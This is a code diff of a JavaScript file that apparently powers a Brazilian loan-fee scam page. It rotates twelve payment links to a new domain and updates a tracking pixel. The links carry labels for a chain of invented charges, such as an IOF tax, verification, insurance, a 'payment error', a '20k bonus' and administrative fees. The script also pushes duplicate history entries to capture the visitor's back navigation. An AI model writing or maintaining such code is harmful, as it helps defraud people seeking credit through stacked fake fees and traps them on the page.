@@ -1,16 +1,16 @@
 const baseLinks = {
-    up1: "https://pay.terminar-hj.fun/nOzxZooQq9xZJ07", // IOF
-    up2: "https://pay.terminar-hj.fun/q510ZOb0nk83E9D", // Taxa de verificação de IOF
-    up3: "https://pay.terminar-hj.fun/YEwR3AVR21kZdKy", // Seguro Prestamista "tarifa de cadastro"
-    up4: "https://pay.terminar-hj.fun/RmA83Ea2q8r3PVp", // NFe
-    up5: "https://pay.terminar-hj.fun/nOzxZooQqQVZJ07", // Ativar conta
-    up6: "https://pay.terminar-hj.fun/NDr8gmKnanpZBmj", // Taxa de registro do contrato
-    up7: "https://pay.terminar-hj.fun/DPXw3XeE9E9Zzmp", // Parabéns, 20k adicional
-    up8: "https://pay.terminar-hj.fun/mwK436d1zqXGQ8b", // Erro no pagamento - 14,06
-    up9: "https://pay.terminar-hj.fun/meABG9dn7DAZ6Ea", // APP - 11,99
-    up10:"https://pay.terminar-hj.fun/NDr8gmKnadpZBmj", // Taxa de Abertura TAC - 16,92
-    up11:"https://pay.terminar-hj.fun/DPXw3XeE919Zzmp",// Taxa de Consultoria Financeira - 19,53
-    up12:"https://pay.terminar-hj.fun/DYp0ZxVMAzlgmvX" // Taxa de Processamento Administrativo - 31,92
+    up1: "https://pay.kitt-hoje.store/YL9jZDWBalO3p4q", // IOF
+    up2: "https://pay.kitt-hoje.store/nOzxZoownMvZJ07", // Taxa de verificação de IOF
+    up3: "https://pay.kitt-hoje.store/lqv130yKDzdZxbj", // Seguro Prestamista "tarifa de cadastro"
+    up4: "https://pay.kitt-hoje.store/PyE2Zy8w1L43qRb", // NFe
+    up5: "https://pay.kitt-hoje.store/7vJOGY4k1qPZKXd", // Ativar conta
+    up6: "https://pay.kitt-hoje.store/a9ArZMlBk4n37xj", // Taxa de registro do contrato
+    up7: "https://pay.kitt-hoje.store/NDr8gmKwB0JZBmj", // Parabéns, 20k adicional
+    up8: "https://pay.kitt-hoje.store/N1nVZpYwBAWGlM6", // Erro no pagamento - 14,06
+    up9: "https://pay.kitt-hoje.store/kYL6geWNOqpZrKM", // APP - 11,99
+    up10:"https://pay.kitt-hoje.store/DPXw3Xea05MZzmpj", // Taxa de Abertura TAC - 16,92
+    up11:"https://pay.kitt-hoje.store/eApQgz2wQnVgEb7",// Taxa de Consultoria Financeira - 19,53
+    up12:"https://pay.kitt-hoje.store/mwK436dB7y4GQ8b" // Taxa de Processamento Administrativo - 31,92
 
 
 };
@@ -36,7 +36,7 @@ function redirect(key) {
 
 // UTMIFY, troque o pixel só aqui, belê?
 (function() {
- window.googlePixelId = "688817c3b0633f5bb4fabb5c";
+ window.googlePixelId = "689b878652af6d331262cdad";
   var a = document.createElement("script");
   a.setAttribute("async", "");
   a.setAttribute("defer", "");
@@ -60,4 +60,5 @@ function redirect(key) {
 
 // Adiciona duas entradas no histórico para capturar a navegação para trás
 history.pushState({}, '', location.href);
+
 history.pushState({}, '', location.href);
